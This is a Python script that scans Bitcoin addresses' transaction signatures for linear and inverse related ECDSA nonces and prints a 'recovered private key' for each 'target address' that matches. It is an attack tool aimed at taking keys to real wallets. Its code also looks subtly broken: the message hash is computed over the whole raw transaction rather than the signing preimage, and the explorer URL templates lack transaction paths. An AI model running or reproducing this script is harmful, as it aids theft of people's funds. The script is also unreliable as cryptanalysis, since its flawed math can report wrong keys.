import json
import itertools
import requests
import hashlib
import time

INPUT_JSON = "raw_transactions.json"
# secp256k1 Elliptic Curve Order (n)
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

API_URLS = [
    "https://blockstream.info{}/hex",
    "https://mempool.space{}/hex",
    "https://blockchain.info{}?format=hex"
]

def decode_der_signature(sig_hex):
    """Parses a hexadecimal DER-encoded ECDSA signature to extract R and S."""
    try:
        sig_bytes = bytes.fromhex(sig_hex)
        if sig_bytes[0] != 0x30: return None, None
        r_length = sig_bytes[3]
        r_bytes = sig_bytes[4:4+r_length]
        
        s_marker_idx = 4 + r_length
        if sig_bytes[s_marker_idx] != 0x02: return None, None
        s_length = sig_bytes[s_marker_idx + 1]
        s_bytes = sig_bytes[s_marker_idx + 2 : s_marker_idx + 2 + s_length]
        
        if len(r_bytes) > 32 and r_bytes[0] == 0x00: r_bytes = r_bytes[1:]
        if len(s_bytes) > 32 and s_bytes[0] == 0x00: s_bytes = s_bytes[1:]
        
        return int(r_bytes.hex(), 16), int(s_bytes.hex(), 16)
    except Exception:
        return None, None

def fetch_raw_hex(txid):
    for url_template in API_URLS:
        try:
            res = requests.get(url_template.format(txid), timeout=8)
            if res.status_code == 200 and len(res.text.strip()) > 60:
                return res.text.strip()
        except:
            continue
    return None

def calculate_z(raw_hex):
    try:
        b = bytes.fromhex(raw_hex)
        h = hashlib.sha256(hashlib.sha256(b).digest()).hexdigest()
        return int(h, 16)
    except:
        return None

def extended_gcd(a, b):
    if a == 0: return b, 0, 1
    g, x1, y1 = extended_gcd(b % a, a)
    x = y1 - (b // a) * x1
    y = x1
    return g, x, y

def modular_inverse(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1: return None
    return x % m

def scan_address_signatures(sigs, address):
    if len(sigs) < 2:
        print(f"ℹ️ Address {address} only has {len(sigs)} signature. Skipping differential analysis.")
        return

    print(f"🔬 Cross-analyzing {len(sigs)} signatures for address {address}...")
    
    for sig1, sig2 in itertools.combinations(sigs, 2):
        r1, s1, z1, tx1 = sig1["r"], sig1["s"], sig1["z"], sig1["txid"]
        r2, s2, z2, tx2 = sig2["r"], sig2["s"], sig2["z"], sig2["txid"]

        if r1 == r2 and s1 == s2: continue

        # ----------------------------------------------------
        # TEST 1: LINEAR NONCE DETECTION (k2 = k1 + 1)
        # ----------------------------------------------------
        num_lin = (s1 * z2 - s2 * z1 - s1 * s2) % N
        den_lin = (s2 * r1 - s1 * r2) % N
        inv_den_lin = modular_inverse(den_lin, N)
        
        if inv_den_lin:
            x_lin = (num_lin * inv_den_lin) % N
            # Verify mathematical correctness
            k1 = (z1 + r1 * x_lin) * modular_inverse(s1, N) % N
            k2 = (z2 + r2 * x_lin) * modular_inverse(s2, N) % N
            if (k2 - k1) % N == 1:
                print(f"\n🚨 CRITICAL VULNERABILITY: Linear Nonce Detected!")
                print(f"  Target Address: {address}")
                print(f"  TX 1: {tx1} | TX 2: {tx2}")
                print(f"  🔑 RECOVERED PRIVATE KEY (HEX): {hex(x_lin)}")
                continue

        # ----------------------------------------------------
        # TEST 2: INVERSE NONCE DETECTION (k2 = k1^-1 mod n)
        # ----------------------------------------------------
        # Formula derivation for k1 * k2 = 1 mod n
        num_inv = (s1 * s2 * z2 - z1) % N
        den_inv = (r1 - s1 * s2 * r2) % N
        inv_den_inv = modular_inverse(den_inv, N)
        
        if inv_den_inv:
            x_inv = (num_inv * inv_den_inv) % N
            # Verify mathematical correctness
            k1 = (z1 + r1 * x_inv) * modular_inverse(s1, N) % N
            k2 = (z2 + r2 * x_inv) * modular_inverse(s2, N) % N
            if (k1 * k2) % N == 1:
                print(f"\n🚨 CRITICAL VULNERABILITY: Inverse Nonce Detected!")
                print(f"  Target Address: {address}")
                print(f"  TX 1: {tx1} | TX 2: {tx2}")
                print(f"  🔑 RECOVERED PRIVATE KEY (HEX): {hex(x_inv)}")
                continue

def main():
    try:
        with open(INPUT_JSON, 'r') as file:
            data = json.load(file)
    except Exception as e:
        print(f"Error loading {INPUT_JSON}: {e}. Make sure to run chugary.py first.")
        return

    # Group signatures by the Bitcoin address they belong to
    address_vault = {}

    print("Fetching active transaction payload states from blockchain history...")
    for address, tx_list in data.items():
        if address not in address_vault:
            address_vault[address] = []
            
        for tx in tx_list:
            txid = tx.get("txid")
            raw_hex = fetch_raw_hex(txid)
            if not raw_hex: continue
            
            z_val = calculate_z(raw_hex)
            if not z_val: continue

            for vin in tx.get("vin", []):
                script_asm = vin.get("scriptsig_asm", "")
                witness = vin.get("witness", [])
                sig_hex = None

                if "OP_PUSHBYTES" in script_asm:
                    for part in script_asm.split():
                        if 140 <= len(part) <= 146: sig_hex = part; break
                if not sig_hex and witness:
                    for item in witness:
                        if 140 <= len(item) <= 146: sig_hex = item; break

                if sig_hex:
                    r, s = decode_der_signature(sig_hex[:-2])
                    if r and s:
                        address_vault[address].append({
                            "txid": txid,
                            "r": r,
                            "s": s,
                            "z": z_val
                        })
            time.sleep(0.1)

    print("\n" + "="*60)
    print("RUNNING CRYPTANALYSIS TESTING MATRIX")
    print("="*60)
    
    for address, sigs in address_vault.items():
        scan_address_signatures(sigs, address)
        
    print("\nAnalysis complete.")

if __name__ == "__main__":
    main()
